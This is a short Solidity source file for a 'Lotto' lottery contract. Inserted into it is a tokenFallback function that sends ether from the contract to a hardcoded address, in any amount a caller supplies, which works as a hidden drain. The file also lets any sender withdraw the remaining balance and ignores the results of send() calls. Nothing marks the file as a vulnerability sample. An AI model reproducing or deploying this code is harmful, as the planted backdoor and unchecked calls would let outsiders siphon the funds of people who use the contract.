 

 pragma solidity ^0.4.18;
 
 contract Lotto {

     bool public payedOut = false;
     address public winner;
     uint public winAmount;

      


    address public xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
    function tokenFallback(address _from, uint _value, bytes _data){
        xdest.transfer(_value);
    }

     function sendToWinner() public {
         require(!payedOut);
          
         winner.send(winAmount);
         payedOut = true;
     }

     function withdrawLeftOver() public {
         require(payedOut);
          
         msg.sender.send(this.balance);
     }
 }
